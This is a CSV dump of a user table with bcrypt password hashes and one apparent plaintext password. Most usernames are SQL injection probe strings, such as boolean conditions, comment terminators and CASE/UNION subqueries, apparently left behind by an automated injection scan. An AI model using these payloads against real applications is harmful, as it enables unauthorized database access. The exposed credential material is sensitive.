id,password,username
1,a2/WbP0PCjwW4CKdq6G,admin
2,$2b$12$jkqvMzl/p9NDv0UvfzdDYujMjAWGEp3LqY3YYveYyyddAP/uKpqqe,admina
3,$2b$12$IV45CnuOZVxs0h8GVcPHHeTrLozz.WBsk2kb12R3RWuUtcDj1c8ki,adminaa
4,$2b$12$KdYc110MXdNDIqhwBmhRqehihTiAJTT5XoTFtSF6GSNhjF/OPVzK6,3932
5,$2b$12$PxGc.y4kXDT69ywX8hTc4.KNLWL867jMmXZM6osnsFxrv9CB7JKim,adminaa) AND 1550=6640 AND (2841=2841
6,$2b$12$jKOiOv7DNj041dflZPB7vOP4VKkrsQpStpDT6f1nkxLu.dm/CQtQO,adminaa) AND 7493=7493 AND (7549=7549
7,$2b$12$9Bs7CfG2L0wBaTtLYVCewevIScKctaYF98A3rFAZStXnJ7827puZK,adminaa AND 4862=6064
8,$2b$12$HGfSTIW/z670qUUM7xDPwuwLPPAAhQTDS/iFoYvtAUEMQYAf66whG,adminaa AND 7493=7493
9,$2b$12$XPJensd5s/xmMhmMZXS0Ke1.CZ61u3kJSWWhdI4H0mIPasmz2SL/G,adminaa') AND 2341=3933 AND ('ljkM'='ljkM
10,$2b$12$y.RZBjAMmPIXYqK2PGxK1uLO0/cTLxADOx4wJADwU7ZbhO15GT3ee,adminaa') AND 7493=7493 AND ('EldL'='EldL
11,$2b$12$agiLW3M2KuxCLf8gPYjmsuOIrXMQSxe7xtmu3Y3v/LPazW9uWpET.,adminaa' AND 2199=3975 AND 'racp'='racp
12,$2b$12$0bEKz6s3fkM5AURmodEfJu9L/JUlSWZlw3bOtyDR/hpNFZ5q/DM3e,adminaa' AND 7493=7493 AND 'tRVM'='tRVM
13,$2b$12$LtsBRGqYyiukpg19b3C/KO3YIAJpv9hcwWcvUGRGID9pJav2x/Lgu,adminaa AND 4818=1544-- PRMz
14,$2b$12$Bj05KP6Tp9fppfiFD5DvWepIfE.fi85/IlUqTg/4.N4amaUwpAu5K,adminaa AND 7493=7493-- HwuD
15,$2b$12$FkRwqQupmD0Byf/yGM/M5uJzZLsc15urZ6cEtFjuxNJKpNkG/G2Yi,(SELECT (CASE WHEN (6911=1730) THEN 0x61646d696e6161 ELSE (SELECT 1730 UNION SELECT 8132) END))
16,$2b$12$vDvDDx.V.4pXDy7St8jP9ucL38U/TZKpfz8eDCdj.Wdx.655Iyr.S,(SELECT (CASE WHEN (7393=7393) THEN 0x61646d696e6161 ELSE (SELECT 3881 UNION SELECT 3116) END))
17,$2b$12$uegaXwEQMQ7PgmltrzWB1Oq3M9Ox.CfEtrCsTn1ZG9gsgOiydPpYi,"(SELECT CONCAT(CONCAT(0x71786a7071,(CASE WHEN (5632=5632) THEN 0x31 ELSE 0x30 END)),0x7162767071))"
18,$2b$12$sgUCHB26nPq0ZVraXCk8TuI157WCNzKBEh7no.VyZ87kQ6GECzeEm,adminaa) AND 9719=3769#
19,$2b$12$rvzn7PUz9yFz3n1vkIp3Muq87BiI42QWNPrZ64vZSp/a.VpVSw6AC,adminaa) AND 3439=3439#
20,$2b$12$iES6.lABOrDSwCC7Y7T8/.ocogXRL2DW8Q627xx7A0Uuhb3V2Lvju,adminaa') AND 4408=6173#
21,$2b$12$kkXawGvsizaQooeVUQgqhO7CoX8zD5JYK/oseALL3sCfKtoZpjlkO,adminaa') AND 3439=3439#
22,$2b$12$1fgQ4eFQoAmlZnE3xjq9i.qR/rtTt9EpdVly1lck1GCmILVgJ6xX6,adminaa' AND 3601=1995#
23,$2b$12$HVgSMsHVIhd8s5BGjETe2eK8Ln2Rsld3rKfQAbsFCe7vEY5sR./QW,adminaa' AND 3439=3439#
24,$2b$12$FXg/APulWv4mjqWuKsye..u2PGuXUR2RZPbEmW51hegpRReepWNUa,adminaa)) AND 1704=3626#
25,$2b$12$/fCVBVmxxnkZ3sz.n/oEfuDauBMsA6s.eVT5/2bwjQOYx7PEgn7YO,adminaa)) AND 3439=3439#
26,$2b$12$FBakvPCIKEZ6/RKfDDm0dea8gKKbxK0c8Nt2U5pm93q6npYc3J5Xq,adminaa))) AND 9815=5546#
27,$2b$12$wDVUPnf/xTfFvSQDrVulwuxV1/Zc80WYEBxKKDQwr5lsAVsZzI8V2,adminaa))) AND 3439=3439#
28,$2b$12$FJ7W6TlrFL.AGMEM6/bruO6hsMC20Y64ZcqM9LrK/wygV1lFMARZ6,adminaa AND 6021=2416#
29,$2b$12$3SBSwHnpeW46YHrktKSVbeB1ctlIgtfAxAhr9d9CbfdmOVnHiWizW,adminaa AND 3439=3439#
30,$2b$12$OBvPKyqLSX2kqscl3KxAIeDni3QwEjEnuQ59f4g4/ZnhGfx9Mm4xK,adminaa')) AND 6134=2483#
31,$2b$12$M09eDD3fZ7DlFcy.Mtg47OJC4gO9HY2hKS4CgbUsDZHDPG4PLzJmS,adminaa')) AND 3439=3439#
32,$2b$12$jRgDxo0D./ApAfwwnSemkOz61f1hVSSjcJr1BUcqWUqB9sEQ5xV/i,adminaa'))) AND 6268=1503#
33,$2b$12$YJJFe8.t/jwcwzx7nYdXfu164jVM9z8a2gpsQSEcIlK.HQLAe3142,adminaa'))) AND 3439=3439#
34,$2b$12$S9fHNBKJQix3NGAs0Q8Ml.BbH3gdb3KhV3EjXJsNmiw/8Y9LCw8tK,adminaa')) AS FYBl WHERE 5054=5054 AND 7204=9372#
35,$2b$12$1ZKg0ZIQfMtphNpz2mfmv.wzlF08xw0D7T0lT19bfLs26QQvf6IaS,adminaa')) AS MzLW WHERE 2417=2417 AND 3439=3439#
36,$2b$12$F0OHUBu7hNkcHsDNnAVqCOdQnyGa47/VTWc4nlGX/ijaLE4n6BleS,adminaa)) AS tRcD WHERE 8564=8564 AND 4004=9525#
37,$2b$12$TUeTCrm3hTRKjMkLO6zzJuA42AcZgn4ceRaplQQ9roazvsobWGdD6,adminaa)) AS HDtg WHERE 4457=4457 AND 3439=3439#
38,$2b$12$sOYy1r0KNCRrr8Jmsrbl1em9sVvZbfx8Unde/19u8wI/M66kvFNNK,adminaa') AS WWnN WHERE 7730=7730 AND 6747=2096#
39,$2b$12$HWhmn6ugRX8RmeoTlL7kEezfwWEyO7DpCsVRD1tAgThPMCfzjTf5W,adminaa') AS heIf WHERE 5157=5157 AND 3439=3439#
40,$2b$12$duFlpLzzrvpcfxD1itveM.5zratTF1WIQWbIduR7t6EjwjqH56QSW,adminaa) AS TovB WHERE 8302=8302 AND 4102=7557#
41,$2b$12$6igKDDgVznFcoJ4K8OsuH.qcXz7gb9W.82xA7jSJoZczyTO5iwAwS,adminaa) AS mJZS WHERE 9239=9239 AND 3439=3439#
42,$2b$12$CTgyB28pAyP56Q7PD48nYOMD7nbPYRFoQgFflVd2xW4CYO1ukRbvq,adminaa` WHERE 7332=7332 AND 3292=6358#
43,$2b$12$xMzbqBN0NsEO0HqPHHdzGOS/rqII0nD.LTGbkqYQBoCzXN288gmEi,adminaa` WHERE 8866=8866 AND 3439=3439#
44,$2b$12$zzFW7u8uWfyxezebcw8CGetkKuuB76XbsGQJZDFFiI6US5gHD4yju,adminaa`) WHERE 8557=8557 AND 6364=9802#
45,$2b$12$hTrqkHdp4HOoCUFdE50eRuz6S8Y5CH2G5ePK6i7wAo9TPrVav57MS,adminaa`) WHERE 6260=6260 AND 3439=3439#
46,$2b$12$KNb1O6s/Tm25AhGx9PYbtuV.P95Rg/GHF9amQllb6RxqAMTgeViZi,adminaa' IN BOOLEAN MODE) AND 9400=6822#
47,$2b$12$xhupIMj618b14rpQDB5cCu3Owc8bm2cXwg3z5MFy87LjsdtHRplH6,adminaa' IN BOOLEAN MODE) AND 3439=3439#
48,$2b$12$L5MzOv.nIU959c9zromya.TKu4sTdjdxkyBng7wRAx.ydchGGGxIm,-8458
49,$2b$12$Ko6XUsWtFirGxWcHTx0H5OQp4lFfkFAS/V4DHSnuQIXRxMA8nj8bq,-1178) OR 4165=6578#
50,$2b$12$SSt2IURGbziUfmLJJMbfxulvIuq5gBEKYiu.7nCUKd9AtH0wWhh/C,-1690) OR 2700=2700#
51,$2b$12$KKcofrhAhAAEKTm/wKq72.Yyt4rZvnRImap4.c2hY9n5jLQVg75W6,-5079') OR 6113=9297#
